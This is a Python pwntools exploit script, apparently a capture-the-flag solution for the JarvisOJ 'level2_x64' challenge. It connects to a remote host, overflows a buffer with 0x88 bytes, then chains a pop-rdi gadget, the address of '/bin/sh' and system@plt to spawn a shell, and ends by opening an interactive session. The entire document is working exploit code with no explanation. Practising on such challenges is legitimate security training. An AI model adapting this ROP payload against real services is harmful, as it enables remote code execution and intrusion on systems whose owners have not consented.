from pwn import *

#p=process('./level2_x64')
p=remote('pwn2.jarvisoj.com',9882)
context(arch='x86-64',os='linux')
elf=ELF("./level2_x64")

plt_sys=elf.plt["system"]
adr_bsh=0x0000000000600a90
pop_rdi=0x00000000004006b3

payload='a'*0x88
payload+=p64(pop_rdi)
payload+=p64(adr_bsh)
payload+=p64(plt_sys)

p.recvuntil(':')
p.sendline(payload)
p.recv()
p.interactive()
